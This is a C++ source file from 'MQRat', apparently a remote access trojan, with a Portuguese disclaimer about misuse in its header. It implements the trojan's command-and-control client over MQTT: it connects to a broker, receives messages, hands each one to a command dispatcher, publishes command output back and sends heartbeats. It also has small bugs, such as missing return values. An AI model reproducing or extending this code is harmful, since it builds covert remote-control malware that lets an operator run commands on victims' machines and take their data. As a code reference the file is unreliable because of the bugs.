/*
	This file is part of MQRat.
	
	Copyright (C) 2019  MQRat Project

	O autor não se responsabiliza por variantes (ou sources originais) deste software 
	que estejam sendo utilizadas para prejudicar terceiros.
*/

#include <iostream>
#include <string>
#include <thread>
#include "mqtt_client.hpp"
#include "utils.hpp"
#include "log.hpp"
#include "command_dispatcher.hpp"
#include "wrappers.hpp"

using namespace std;

MqttClient::MqttClient() {
	this->qos = 0;
    this->client = nullptr;
    this->broker_host = "127.0.0.1";
    this->reconnect_timeout = 5000;
}

MqttClient::MqttClient(unsigned qos_level, string broker_hostname) {
	this->qos = qos_level;
    this->client = nullptr;
    this->broker_host = broker_hostname;
    this->reconnect_timeout = 5000;
    dispatcher = new CommandDispatcher(nullptr, this);
}

bool MqttClient::Setup() {

    // Create MQTT client
    int status = MQTTClient_create(&client, this->broker_host.c_str(), Utils::GenerateID().c_str(), MQTTCLIENT_PERSISTENCE_NONE, NULL);
    if(status != MQTTCLIENT_SUCCESS) {
        return false;
    }

    // Configure callbacks
    MQTTClient_setCallbacks(client, this, Wrappers::onLost, Wrappers::onMsgReceived, Wrappers::onDelivered);
}


void MqttClient::Subscribe(string topic) {
	MQTTClient_subscribe(client, topic.c_str(), this->qos);
}

void MqttClient::ConfigureOptions(MQTTClient_connectOptions *options) {
        options->connectTimeout = 10;
        options->MQTTVersion = MQTTVERSION_5;
        options->cleansession = 0;
        options->will = NULL;
}

void MqttClient::Connect() {
    MQTTClient_connectOptions options;

    // Try connect with broker
    if(client != NULL) {
        this->ConfigureOptions(&options);
        if(MQTTClient_connect(client, &options) != MQTTCLIENT_SUCCESS) {
            Log::LogPanic("Failed to connect with broker");
        }

        // Sends the heartbeat
        SendHeartbeat();
    }
}

void MqttClient::Publish(string data, string topic) {
    auto status = MQTTClient_publish(client, topic.c_str(), data.length(), 
                    reinterpret_cast<const void*>(data.c_str()), 0, 0, nullptr);
    
    if(status != MQTTCLIENT_SUCCESS) {
        Log::LogError("Failed to publish data: " + status);
    }
}

void MqttClient::Loop() {
    while(true) {
        Sleep(this->reconnect_timeout);
    }
}

void MqttClient::Publish(vector<string> data, string topic)
{
    string payload = "";

    for(const auto& output : data) {
        payload += output + "\n";
    }

    this->Publish(payload, topic);
}

MQTTClient MqttClient::GetClient() {
    return client;
}

void MqttClient::OnConnectionLost(void *context, char *cause) {
    Log::LogError("Connection lost with broker. Reconnecting");
    Sleep(reconnect_timeout);
    this->Connect();
}

int MqttClient::OnMessageReceived(void *context, char *topic, int topic_len, MQTTClient_message *message) {

    // Dispatch received command
    dispatcher->setMessage(message);
    dispatcher->Dispatch();
}

void MqttClient::OnDelivered(void* context, MQTTClient_deliveryToken dt) {

}

void MqttClient::setSendTopic(std::string new_topic)
{
    this->send_topic = new_topic;
}

string MqttClient::getSendTopic()
{
    return this->send_topic;
}

void MqttClient::SendHeartbeat()
{
    this->Publish("/hb", getRecvTopic());
}

string MqttClient::getRecvTopic()
{
    return this->recv_topic;
}

void MqttClient::setRecvTopic(string new_topic)
{
    this->recv_topic = new_topic;
}